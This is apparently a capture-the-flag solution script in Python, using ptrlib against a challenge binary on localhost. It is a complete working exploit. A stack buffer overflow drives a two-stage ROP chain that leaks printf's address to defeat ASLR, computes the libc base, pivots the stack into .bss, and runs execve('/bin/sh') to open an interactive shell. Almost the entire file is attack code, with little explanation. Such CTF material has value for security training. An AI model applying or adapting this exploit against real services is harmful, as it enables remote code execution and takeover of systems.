from ptrlib import *

libc = ELF("../challenge/libc-2.27.so")
elf = ELF("../challenge/chall")
sock = Socket("localhost", 9002)

plt_read = 0x400650
plt_puts = 0x400620
rop_pop_rsi_r15 = 0x4009b1
rop_pop_rdi = 0x4009b3
rop_pop_rbp = 0x4006d8
rop_leave = 0x40087a

# Stage 1
payload = b'A' * 120
payload += p64(rop_pop_rdi)
payload += p64(elf.got("printf"))
payload += p64(plt_puts)
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi_r15)
payload += p64(elf.symbol("__bss_start"))
payload += p64(0)
payload += p64(plt_read) # read(0, __bss_start, 0x100)
payload += p64(rop_pop_rbp)
payload += p64(elf.symbol("__bss_start"))
payload += p64(rop_leave)
sock.recvuntil("Input: ")
sock.send(payload)
sock.recvline()
addr_printf = u64(sock.recvline().rstrip())
libc_base = addr_printf - libc.symbol("printf")
dump("libc base = " + hex(libc_base))

rop_pop_rax = libc_base + 0x000439c7
#rop_pop_rdi = libc_base
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rdx = libc_base + 0x00001b96
rop_syscall = libc_base + 0x000013c0

# Stage 2
payload = p64(0xffffffffffffffff)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.send(payload)

# Get the shell!
sock.interactive()
